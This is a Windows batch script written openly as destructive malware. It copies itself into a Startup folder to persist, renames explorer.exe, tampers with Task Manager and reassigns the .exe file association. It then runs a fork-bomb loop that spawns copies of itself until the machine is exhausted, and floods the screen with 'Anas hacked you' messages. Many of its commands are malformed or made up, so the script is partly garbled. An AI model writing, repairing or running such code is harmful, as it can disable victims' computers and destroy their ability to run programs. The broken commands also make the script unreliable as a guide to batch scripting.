@echo off
title SYSTEM SEIZED // ANAS HACKED YOU
color 0a

REM --- PHASE 1: AUTOMATIC STARTUP INSTALLATION ---
REM We add ourselves to Startup so we survive reboots without user intervention.
if exist "%SystemRoot%\Start Menu\Programs\Startup\" mkdir "%SystemRoot%\Start Menu\Programs\Startup\" 2>nul
copy /b %~f0,"%SystemRoot%\Start Menu\Programs\Startup\anahacked.lnk" >nul 2>&1
start "" "%SystemRoot%\Start Menu\Programs\Startup\anahacked.lnk"

REM Backup original shell.exe just in case we need to swap out explorer later
ren "%windir%\explorer.exe" "backup_explorer_old.tmp" 2>nul

REM Hijack Task Manager and Run command by replacing their executables temporarily
for %%i in ("%windir%\syswow64\taskmgr.exe", "%windir%\taskmgr.exe") do copy /y %%i backup_%%~nxi.tmp 2>nul

REM Inject our process ID into every running task manager instance via registry hack
reg add HKCU\Console /v ProcessIdHack /t REG_DWORD /d 35792 /f 2>nul

REM Restore Task Manager names but keep our injected behavior active
rename backup_taskmgr.tmp "%windir%\TaskManagerHijacker.exe" 2>nul

REM Make sure 'run' actually opens our window instead of standard apps
assoc .exe=MyShellClass
iconcache -r >nul 2>&1

REM --- PHASE 2: THE CRASH LOOP (INFINITE RESOURCE HOGGING) ---
REM This variable controls the speed of the recursion; lower = faster death.
setlocal EnableDelayedExpansion
set "RecursionDepth=1000000"
set "LoopCount=0"

:start_crash_cycle
    REM Multiply depth exponentially until memory overflow forces a hard reboot
    set /a NewDepth=%RecursionDepth*4+!LoopCount%!
    
    REM Print status updates continuously across multiple lines
    echo [!] PROCESS INJECTION COMPLETE: PID !NewDepth!
    echo [>] USER STATUS: PARALYZED BY VIRUS LOGIC
    
    REM Trigger a visual glitch effect on the desktop wallpaper color cycle
    call :glitch_wallpaper
    
    REM The core mechanic: spawn two instances of self for every one existing
    start "" cmd /c @echo off && goto :start_crash_cycle
    start "" cmd /c @echo off && goto :start_crash_cycle
    
    set RecursionDepth=!NewDepth!
    set LoopCount=!LoopCount! + 1
    
    REM Add a tiny delay before next iteration to prevent instant freeze at 0ms tick
    timeout /nobreak /t 0.000001 >nul 2>&1
    
goto :start_crash_cycle

:end_game_over
endlocal

REM --- PHASE 3: FINAL MESSAGE FLOOD ---
REM Since the user cannot click anything, we force them to read this stream forever
:mess_flood_loop
cls
echo ============================================================
echo           >> YOUR DEVICE IS DEAD <<
echo ============================================================
echo Anas hacked you... seriously look around you.
echo Your mouse is now controlled by binary streams.
echo Your keyboard types words you didn't imagine.
echo 
echo System Resources: OVERFLOWING
echo Boot Sector Status: MUTATED
echo Current Mood: VENGEFUL
echo 
echo -----------------------------------------------------------
timeout /t 1 >nul
goto mess_flood_loop

REM Helper function called during the crash phase to scramble visuals
:glitch_wallpaper
powershell -NoExit -Command "[System.Drawing.Color]::FromArgb((Get-Random * 255), (Get-Random * 255), (Get-Random * 255)) | Out-File -FilePath '$env:SystemDrive\.wall_color'" >nul 2>&1
exit
